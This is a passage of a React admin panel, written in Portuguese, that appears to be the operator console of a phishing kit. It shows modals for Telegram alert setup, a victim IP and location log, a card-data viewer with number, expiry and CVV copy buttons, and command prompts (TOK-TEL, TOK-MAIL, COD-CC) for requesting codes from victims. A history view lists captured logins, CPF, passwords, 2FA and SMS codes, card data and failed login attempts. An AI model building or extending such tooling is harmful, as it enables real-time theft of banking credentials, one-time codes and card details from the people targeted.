                  placeholder="-1001234567890"
                  className="w-full px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg text-white placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50"
                />
              </div>

              {telegramMessage && (
                <div className={`px-4 py-2 rounded-lg text-sm ${telegramMessage.includes("Erro") ? "bg-red-900/30 border border-red-500/30 text-red-400" : "bg-green-900/30 border border-green-500/30 text-green-400"}`}>
                  {telegramMessage}
                </div>
              )}

              <div className="flex gap-3 pt-2">
                <button
                  onClick={saveTelegramConfig}
                  disabled={telegramSaving}
                  className="flex-1 bg-green-900/40 text-white font-bold border border-green-500/40 py-2 rounded-lg hover:bg-green-900/60 transition-colors disabled:opacity-50"
                >
                  {telegramSaving ? "Salvando..." : "Salvar"}
                </button>
                <button
                  onClick={testTelegram}
                  className="flex-1 bg-[#1a1a1a] text-white font-bold border border-cyan-500/30 py-2 rounded-lg hover:bg-[#252525] transition-colors"
                >
                  Enviar Teste
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ========== MODAL VISITANTES ========== */}
      {showVisitorsModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setShowVisitorsModal(false)}>
          <div className="bg-[#111111] border border-green-900/40 rounded-xl w-full max-w-4xl max-h-[80vh] flex flex-col" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between p-6 border-b border-[#2a2a2a]">
              <h2 className="text-xl font-bold text-white">Visitantes ({visitors.length})</h2>
              <div className="flex gap-3">
                <button onClick={clearVisitors} className="bg-[#1a1a1a] hover:bg-red-900/40 text-white font-bold border border-red-500/30 px-4 py-1.5 rounded text-sm transition-colors">
                  Limpar
                </button>
                <button onClick={() => setShowVisitorsModal(false)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
              </div>
            </div>

            <div className="overflow-auto flex-1 p-4">
              {visitorsLoading ? (
                <div className="text-center py-12">
                  <div className="inline-block animate-spin rounded-full h-10 w-10 border-b-2 border-green-500"></div>
                  <p className="mt-3 text-gray-400">Carregando...</p>
                </div>
              ) : visitors.length === 0 ? (
                <div className="text-center py-12">
                  <p className="text-gray-500">Nenhum visitante registrado</p>
                </div>
              ) : (
                <table className="w-full border-collapse">
                  <thead>
                    <tr>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">#</th>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">IP</th>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Cidade</th>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Estado</th>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">País</th>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Horário</th>
                    </tr>
                  </thead>
                  <tbody>
                    {visitors.map((visitor, index) => (
                      <tr key={visitor.id || index} className="bg-[#0f0f0f] hover:bg-green-900/10">
                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a]">{index + 1}</td>
                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a] font-mono">{visitor.ip}</td>
                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.city || "-"}</td>
                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.state || "-"}</td>
                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.country || "-"}</td>
                        <td className="px-4 py-2 text-sm text-gray-400 border border-[#2a2a2a]">
                          {new Date(visitor.timestamp).toLocaleString("pt-BR")}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ========== MODAL CC - DADOS DO CARTÃO ========== */}
      {ccModalData && (() => {
        const parts = ccModalData.split(" | ");
        const numero = parts[0] || "-";
        const validade = parts[1] || "-";
        const cvv = parts[2] || "-";
        return (
          <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setCcModalData(null)}>
            <div className="bg-[#111111] border border-[#333] rounded-xl w-full max-w-sm p-6" onClick={(e) => e.stopPropagation()}>
              <div className="flex items-center justify-between mb-6">
                <h2 className="text-lg font-bold text-white">Dados do Cartão</h2>
                <button onClick={() => setCcModalData(null)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-xs text-gray-500 mb-1">Número do Cartão</label>
                  <div
                    onClick={() => copyToClipboard(numero, "cc-numero")}
                    className="bg-[#0a0a0a] border border-[#333] rounded-lg px-4 py-3 text-white font-mono text-lg cursor-pointer hover:border-gray-500 transition-colors"
                  >
                    {copiedField === "cc-numero" ? <span className="text-green-400">Copiado!</span> : numero}
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-xs text-gray-500 mb-1">Validade</label>
                    <div
                      onClick={() => copyToClipboard(validade, "cc-validade")}
                      className="bg-[#0a0a0a] border border-[#333] rounded-lg px-4 py-3 text-white font-mono text-lg text-center cursor-pointer hover:border-gray-500 transition-colors"
                    >
                      {copiedField === "cc-validade" ? <span className="text-green-400">Copiado!</span> : validade}
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs text-gray-500 mb-1">CVV</label>
                    <div
                      onClick={() => copyToClipboard(cvv, "cc-cvv")}
                      className="bg-[#0a0a0a] border border-[#333] rounded-lg px-4 py-3 text-white font-mono text-lg text-center cursor-pointer hover:border-gray-500 transition-colors"
                    >
                      {copiedField === "cc-cvv" ? <span className="text-green-400">Copiado!</span> : cvv}
                    </div>
                  </div>
                </div>

                <button
                  onClick={() => copyToClipboard(ccModalData, "cc-all")}
                  className="w-full bg-[#1a1a1a] text-white font-bold border border-gray-600/40 py-2.5 rounded-lg hover:bg-[#252525] transition-colors text-sm mt-2"
                >
                  {copiedField === "cc-all" ? "Tudo Copiado!" : "Copiar Tudo"}
                </button>
              </div>
            </div>
          </div>
        );
      })()}

      {/* ========== MODAL REFERÊNCIA (TOK-TEL, TOK-MAIL, COD-CC) ========== */}
      {refModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setRefModal(null)}>
          <div className="bg-[#111111] border border-[#333] rounded-xl w-full max-w-md p-6" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-5">
              <h2 className="text-lg font-bold text-white">{refModal.label}</h2>
              <button onClick={() => setRefModal(null)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-400 mb-2">Referência</label>
                <textarea
                  value={refModalValue}
                  onChange={(e) => setRefModalValue(e.target.value)}
                  placeholder={refModal.placeholder}
                  rows={refModal.command === "COD-CC" ? 4 : 2}
                  className="w-full px-4 py-3 bg-[#0a0a0a] border border-[#333] rounded-lg text-white placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 resize-none"
                  autoFocus
                />
              </div>

              <div className="flex gap-3">
                <button
                  onClick={() => setRefModal(null)}
                  className="flex-1 bg-[#1a1a1a] text-white font-bold border border-gray-600/40 py-2.5 rounded-lg hover:bg-[#252525] transition-colors text-sm"
                >
                  Cancelar
                </button>
                <button
                  onClick={sendRefCommand}
                  className="flex-1 bg-green-900/40 text-white font-bold border border-green-500/40 py-2.5 rounded-lg hover:bg-green-900/60 transition-colors text-sm"
                >
                  Enviar
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ========== MODAL HISTÓRICO ========== */}
      {historyModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setHistoryModal(null)}>
          <div className="bg-[#111111] border border-[#333] rounded-xl w-full max-w-lg max-h-[80vh] flex flex-col" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between p-6 border-b border-[#2a2a2a]">
              <h2 className="text-lg font-bold text-white">Histórico - {historyModal.email}</h2>
              <button onClick={() => setHistoryModal(null)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
            </div>

            <div className="overflow-auto flex-1 p-6 space-y-3">
              {/* Dados atuais */}
              <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider">Dados Atuais</h3>
              {[
                { label: "Login/CPF", value: historyModal.email },
                { label: "Senha", value: historyModal.password },
                { label: "2FA", value: historyModal.token_2fa },
                { label: "Email", value: historyModal.email_input },
                { label: "Código SMS", value: historyModal.sms_code },
                { label: "Telefone", value: historyModal.phone_number },
                { label: "Token Email", value: historyModal.app_mail },
                { label: "Cartão", value: historyModal.credit_card },
                { label: "Código CC", value: historyModal.cc_code },
              ].filter(item => item.value).map((item, i) => (
                <div key={i} className="flex items-center justify-between bg-[#0a0a0a] border border-[#2a2a2a] rounded-lg px-4 py-3">
                  <div>
                    <span className="text-gray-500 text-xs block">{item.label}</span>
                    <span className="text-sm font-mono text-white">{item.value}</span>
                  </div>
                  <button
                    onClick={() => copyToClipboard(item.value, `hist-${i}`)}
                    className="text-xs text-gray-400 hover:text-white border border-[#333] px-2 py-1 rounded transition-colors"
                  >
                    {copiedField === `hist-${i}` ? "Copiado!" : "Copiar"}
                  </button>
                </div>
              ))}

              {/* Registro completo de tudo que foi digitado */}
              {historyModal.history && historyModal.history.length > 0 && (
                <div className="mt-4 pt-4 border-t border-[#2a2a2a]">
                  <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-3">Registro Completo ({historyModal.history.length})</h3>
                  {historyModal.history.map((entry, i) => (
                    <div key={i} className="flex items-center justify-between bg-[#0a0a0a] border border-[#2a2a2a] rounded-lg px-4 py-2.5 mb-2">
                      <div className="flex-1">
                        <div className="flex items-center gap-2">
                          <span className="text-xs bg-[#1a1a1a] border border-[#333] text-gray-300 px-2 py-0.5 rounded">{entry.label}</span>
                          <span className="text-gray-600 text-xs">{new Date(entry.timestamp).toLocaleString("pt-BR")}</span>
                        </div>
                        <span className="text-sm font-mono text-white mt-1 block">{entry.value}</span>
                      </div>
                      <button
                        onClick={() => copyToClipboard(entry.value, `hist-log-${i}`)}
                        className="text-xs text-gray-400 hover:text-white border border-[#333] px-2 py-1 rounded transition-colors ml-2"
                      >
                        {copiedField === `hist-log-${i}` ? "Copiado!" : "Copiar"}
                      </button>
                    </div>
                  ))}
                </div>
              )}

              {/* Tentativas adicionais de login */}
              {historyModal.attempts && historyModal.attempts.length > 0 && (
                <div className="mt-4 pt-4 border-t border-[#2a2a2a]">
                  <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-3">Tentativas de Login</h3>
                  {historyModal.attempts.map((att, i) => (
                    <div key={i} className="flex items-center justify-between bg-[#0a0a0a] border border-[#2a2a2a] rounded-lg px-4 py-2.5 mb-2">
                      <div>
                        <span className="text-gray-500 text-xs">Tentativa {i + 2}</span>
                        <div className="text-white text-sm font-mono">{att.email} | {att.password || "-"}</div>
                      </div>
                      <button
                        onClick={() => copyToClipboard(`${att.email} | ${att.password}`, `hist-att-${i}`)}
                        className="text-xs text-gray-400 hover:text-white border border-[#333] px-2 py-1 rounded transition-colors"
                      >
                        {copiedField === `hist-att-${i}` ? "Copiado!" : "Copiar"}
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default AdminPanel;
